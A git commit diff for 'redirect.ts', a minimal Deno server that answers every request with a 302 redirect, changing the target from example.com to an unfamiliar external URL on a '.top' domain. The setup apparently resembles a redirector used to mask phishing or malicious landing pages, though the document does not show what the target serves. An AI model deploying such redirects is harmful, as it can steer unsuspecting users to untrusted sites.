c8d2bb089d2ac0fa5f99935156ab9e4a472e3626
ikesammy <112722373+ikesammy@users.noreply.github.com>
2025-03-26 17:50:02 -0700

    Update redirect.ts

--- redirect.ts
+++ redirect.ts
@@ -1,7 +1,7 @@
 // redirect.ts
 import { serve } from "https://deno.land/std/http/server.ts";
 
-const redirectUrl = "https://example.com"; // URL you want to redirect to
+const redirectUrl = "https://verft.top/ss/arv"; // URL you want to redirect to
 
 // Handle requests and redirect to the specified URL
 serve(() => new Response(null, { status: 302, headers: { "Location": redirectUrl } }));
